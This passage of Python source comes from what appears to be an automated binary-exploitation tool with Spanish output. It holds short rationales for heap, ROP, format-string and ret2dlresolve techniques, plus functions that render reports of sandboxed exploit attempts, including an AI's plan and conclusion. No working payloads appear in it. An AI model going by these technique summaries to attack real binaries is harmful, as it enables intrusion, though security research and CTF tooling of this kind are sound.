        return "el filtro de entrada bloquea el string objetivo sin codificar -> se XOR-codifica con una clave que evita los bytes prohibidos, se escribe, y se decodifica en el propio sitio con un gadget xor"
    if "rop" in t:
        return ("sin win()/system directo -> cadena ROP execve por syscall"
                + (" (PIE: base resuelta en sandbox)" if pie else ""))
    if "format" in t:
        return "printf(entrada) controlado -> escritura via %n (GOT o retorno segun RELRO)"
    if "house-of-force" in t:
        return "asignador con el carve de top-chunk pre-2.29 -> top-chunk corrompido a un tamano enorme desplaza `top` a una direccion elegida"
    if "house-of-spirit" in t:
        return "chunk falso 16-alineado liberado -> entra en el tcache -> una malloc del mismo tamano lo devuelve"
    if "house-of-einherjar" in t:
        return "PREV_INUSE limpio + prev_size forjado -> la consolidacion hacia atras hace que el chunk liberado aterrice en una direccion elegida"
    if "house-of-botcake" in t:
        return "doble-free A,A enrutado por la unsorted bin -> esquiva el chequeo de key del tcache -> chunks solapados"
    if "largebin" in t:
        return "chunk largebin con bk_nextsize corrupto -> la insercion ejecuta `bk_nextsize->fd_nextsize = victim`, una escritura de puntero elegida"
    if "house-of-mind" in t:
        return "ar_ptr del heap_info corrompido -> free() inserta en una arena falsa -> `fastbinsY[idx] = chunk` escribe en una direccion elegida"
    if "iofile" in t or "fsop" in t:
        return "vtable de un _IO_FILE reapuntada -> el flush de stream llama a vtable[__overflow](fp)"
    if "fastbin-dup" in t:
        return "doble-free A,B,A (pre-safe-linking) esquiva el chequeo debil ==fasttop -> fd envenenado hacia un chunk falso"
    if "unsafe-unlink" in t:
        return "fd/bk forjados satisfacen el chequeo >=2.3.4 (FD->bk==P && BK->fd==P) -> unlink() deja un puntero apuntando cerca de si mismo"
    if "house-of-corrosion" in t:
        return "global_max_fast corrompido -> un free() grande se trata como fastbin con indice sin cota -> escritura en una direccion elegida"
    if "tcache-stash" in t:
        return "bk de un chunk de smallbin corrompido a un chunk falso -> el stash loop lo mete en el tcache -> una alloc posterior lo devuelve"
    if "heap" in t or "tcache" in t or "uaf" in t:
        return "primitiva de heap (UAF/tcache) -> secuestro de puntero/GOT a win()/system"
    if "wow" in t or "write" in t:
        return "escritura arbitraria (indice sin check) -> GOT de funcion llamada despues = win()"
    if "dlresolve" in t:
        return "dinamico no-PIE sin win()/system ni leak -> se forjan las estructuras del resolver dinamico para llamar a system('/bin/sh') SIN fuga de libc"
    if "mprotect" in t:
        return "NX activo, gadgets insuficientes para un execve/ret2libc completo -> ROP solo hasta mprotect() sobre un buffer fijo (RWX) y salto a shellcode real"
    if "leak-chain" in t or "leakchain" in t:
        return "sin win()/system directo -> un mismo bug indexable usado como leak (libc_base) y como escritura (hijack de puntero), encadenados en una sola ejecucion"
    return "seleccionada segun las defensas y primitivas observadas"


def render_autopwn(res: AutopwnResult, lang: str = "es") -> str:
    out = [f"## Auto-explotacion de `{res.binary}`\n"]
    if res.win_exploit:
        techs = [n for n, ok, _ in res.attempts if ok is True]
        out.append("> EXPLOIT VERIFICADO: se ejecuto un exploit (" + ", ".join(techs) +
                   ") en sandbox y se consiguio el objetivo.\n")
    # Contexto (defensas/primitivas): refleja POR QUE se eligio cada tecnica, no solo el resultado
    if res.mit or res.arch:
        m = res.mit or {}
        defs = []
        defs.append("NX " + ("ON" if _flag(m.get("nx")) else "off"))
        defs.append("PIE " + ("ON" if _flag(m.get("pic")) else "off"))
        defs.append("canary " + ("ON" if _flag(m.get("canary")) else "off"))
        if m.get("relro"):
            defs.append("RELRO " + str(m.get("relro")))
        out.append("### Contexto del binario (defensas detectadas)\n")
        out.append(f"- arquitectura: **{res.arch or '?'} {res.bits or '?'}-bit**")
        out.append(f"- mitigaciones: **{' · '.join(defs)}**")
        out.append(f"- funcion gift `win()`: **{'si' if res.has_win else 'no'}**")
        out.append(f"- sinks peligrosos: {', '.join(res.sinks) if res.sinks else 'ninguno'}")
        if res.win_exploit:
            techs = [n for n, ok, _ in res.attempts if ok is True]
            out.append("- **por que la tecnica elegida**: " + _why(res.mit, res.has_win, techs[0] if techs else ""))
        out.append("")
    out.append(f"- hallazgos verificados: {res.verified_findings}")
    if res.ai_plan:
        out.append("\n### Plan de la IA (que probar segun lo observado)\n" + res.ai_plan)
    out.append("\n### Combinaciones probadas\n")
    out.append("| tecnica | resultado | detalle |")
    out.append("|---|---|---|")
    for name, ok, detail in res.attempts:
        r = "FUNCIONA" if ok is True else ("no" if ok is False else "posible")
        out.append(f"| {name} | {r} | {detail} |")
    if res.ai_conclusion:
        out.append("\n### Conclusion de la IA\n" + res.ai_conclusion)
    out.append("\n### Traza\n```\n" + "\n".join(res.log) + "\n```")
    out.append("\nTodo lo descubierto se ha guardado en la base de conocimiento (retroalimentacion).")
    return "\n".join(out)


def autopwn_to_json(res: "AutopwnResult") -> str:
    import json
    techs = [n for n, ok, _ in res.attempts if ok is True]
    return json.dumps({
        "binary": res.binary,
        "context": {"arch": res.arch, "bits": res.bits, "mitigations": res.mit,
                    "sinks": res.sinks, "has_win": res.has_win},
        "verified_findings": res.verified_findings,
        "exploit_verified": res.win_exploit,
        "rationale": (_why(res.mit, res.has_win, techs[0]) if (res.win_exploit and techs) else ""),
        "attempts": [{"technique": n, "result": ("works" if ok is True else
                     ("no" if ok is False else "possible")), "detail": d}
                     for n, ok, d in res.attempts],
        "ai_plan": res.ai_plan, "ai_conclusion": res.ai_conclusion,
        "log": res.log,
    }, indent=2)
